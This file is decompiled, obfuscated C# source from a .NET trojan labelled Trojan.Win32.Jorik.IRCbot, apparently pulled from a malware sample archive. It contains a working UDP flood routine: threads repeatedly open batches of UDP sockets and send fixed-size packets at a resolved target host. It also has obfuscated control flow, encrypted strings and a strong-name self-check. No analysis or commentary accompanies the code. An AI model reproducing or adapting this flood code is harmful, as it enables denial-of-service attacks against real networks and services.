// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0004;
using \u000F;
using System;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;

namespace \u0002
{
  internal sealed class \u0002
  {
    private static ThreadStart[] \u0001;
    private static Thread[] \u0001;
    public static string \u0001;
    public static int \u0001;
    private static IPEndPoint \u0001;
    public static int \u0002;
    private static \u0002.\u0002.\u0001[] \u0001;
    public static int \u0003;
    public static int \u0004;
    public static int \u0005;
    public static bool \u0001;
    [NonSerialized]
    internal static \u0008.\u0004 \u009B;

    public static void \u0001()
    {
      Thread thread1 = new Thread(new ThreadStart(\u0002.\u0002.\u0002));
      if (true)
        goto label_2;
label_1:
      Thread thread2;
      \u0084.\u007E\u0094\u0002((object) thread2, true);
      \u0013.\u007E\u0002\u0002((object) thread2);
      return;
label_2:
      thread2 = thread1;
      goto label_1;
    }

    public static void \u0002()
    {
      try
      {
        \u0002.\u0002.\u0001 = new IPEndPoint(\u0087.\u007E\u009F\u0002((object) \u0086.\u009D\u0002(\u0002.\u0002.\u0001))[0], \u0002.\u0002.\u0002);
      }
      catch
      {
        \u0002.\u0002.\u0001 = new IPEndPoint(\u0088.\u0001\u0003(\u0002.\u0002.\u0001), \u0002.\u0002.\u0002);
      }
      \u0002.\u0002.\u0001 = new Thread[\u0002.\u0002.\u0004];
      \u0002.\u0002.\u0001 = new ThreadStart[\u0002.\u0002.\u0004];
      \u0002.\u0002.\u0001 = new \u0002.\u0002.\u0001[\u0002.\u0002.\u0004];
      for (int index = 0; index < \u0002.\u0002.\u0004; ++index)
      {
        \u0002.\u0002.\u0001[index] = new \u0002.\u0002.\u0001(\u0002.\u0002.\u0001, \u0002.\u0002.\u0003, \u0002.\u0002.\u0005);
        if (true)
        {
          \u0002.\u0002.\u0001[index] = new ThreadStart(\u0002.\u0002.\u0001[index].\u0001);
          \u0002.\u0002.\u0001[index] = new Thread(\u0002.\u0002.\u0001[index]);
        }
        \u0013.\u007E\u0002\u0002((object) \u0002.\u0002.\u0001[index]);
      }
      \u001F.\u0087\u0002(\u0002.\u0002.\u0001 * 1000);
      if (!\u0002.\u0002.\u0001)
        return;
      \u0002.\u0002.\u0003();
      string[] strArray = new string[5]
      {
        \u0002.\u0002.\u009B(1548),
        \u000E.\u0002.\u0001(\u0010.\u008D(\u0002.\u0002.\u009B(569), \u0002.\u0002.\u0001)),
        \u0002.\u0002.\u009B(888),
        \u000E.\u0002.\u0001(\u0089.\u0002\u0003((object) \u0002.\u0002.\u009B(569), (object) \u0002.\u0002.\u0001)),
        \u0002.\u0002.\u009B(897)
      };
      \u000E.\u0002.\u0001(\u0018.\u001A\u0002(strArray), \u0001.\u0010);
    }

    public static void \u0003() => \u0002.\u0002.\u0001 = false;

    static \u0002()
    {
      \u0005.\u0001(typeof (\u0002.\u0002));
      bool flag = false;
      if (true)
      {
        Assembly assembly = \u007F.\u0089\u0002();
        while (\u0002.\u0002.\u0001(\u0003.\u007E\u0006((object) assembly), true, out flag))
        {
          if (true)
          {
            int num = flag ? 1 : 0;
            if (true)
            {
              if (num != 0)
              {
                if (true)
                {
                  if (\u0005.\u007E\u0082((object) \u0003.\u007E\u0007((object) assembly), \u0002.\u0002.\u009B(657)))
                  {
                    if (true)
                      num = 25;
                    else
                      goto label_11;
                  }
                  else
                    break;
                }
                else
                  goto label_12;
              }
              else
                break;
            }
            \u0002.\u0002.\u0003 = num;
label_11:
            \u0002.\u0002.\u0004 = 5;
label_12:
            \u0002.\u0002.\u0005 = 256;
            goto label_13;
          }
        }
        throw new SecurityException(\u0002.\u0002.\u009B(682));
      }
label_13:
      \u0002.\u0002.\u0001 = false;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    private sealed class \u0001
    {
      private IPEndPoint \u0001;
      private int \u0001;
      private Socket[] \u0001;
      private int \u0002;

      public \u0001([In] IPEndPoint obj0, [In] int obj1, [In] int obj2)
      {
        this.\u0001 = obj0;
        this.\u0002 = obj1;
        this.\u0001 = obj2;
      }

      public void \u0001()
      {
label_20:
        int index;
        while (\u0002.\u0002.\u0001)
        {
          if (true)
          {
            byte[] numArray = new byte[this.\u0001];
            try
            {
              this.\u0001 = new Socket[this.\u0002];
              if (true)
                index = 0;
              else
                goto label_12;
label_4:
              while (index >= this.\u0002)
              {
                \u001F.\u0087\u0002(100);
                for (index = 0; index < this.\u0002; ++index)
                {
                  if (\u008C.\u007E\u0006\u0003((object) this.\u0001[index]))
                    \u0084.\u007E\u0096\u0002((object) this.\u0001[index], false);
                  \u0013.\u007E\u0003\u0002((object) this.\u0001[index]);
                  this.\u0001[index] = (Socket) null;
                  if (false)
                    goto label_4;
                }
                this.\u0001 = (Socket[]) null;
                goto label_20;
              }
label_12:
              this.\u0001[index] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
              \u0084.\u007E\u0095\u0002((object) this.\u0001[index], false);
              int num = \u0095.\u007E\u001B\u0003((object) this.\u0001[index], numArray, (EndPoint) this.\u0001);
              ++index;
              goto label_4;
            }
            catch
            {
              for (index = 0; index < this.\u0002; ++index)
              {
                try
                {
                  if (\u008C.\u007E\u0006\u0003((object) this.\u0001[index]))
                    \u0084.\u007E\u0096\u0002((object) this.\u0001[index], false);
                  \u0013.\u007E\u0003\u0002((object) this.\u0001[index]);
                  this.\u0001[index] = (Socket) null;
                }
                catch
                {
                }
              }
            }
          }
          else
            goto label_29;
        }
        index = 0;
label_29:
        for (; index < this.\u0002; ++index)
        {
          try
          {
            if (\u008C.\u007E\u0006\u0003((object) this.\u0001[index]))
              \u0084.\u007E\u0096\u0002((object) this.\u0001[index], false);
            if (true)
            {
              \u0013.\u007E\u0003\u0002((object) this.\u0001[index]);
              this.\u0001[index] = (Socket) null;
            }
          }
          catch
          {
          }
        }
      }
    }
  }
}
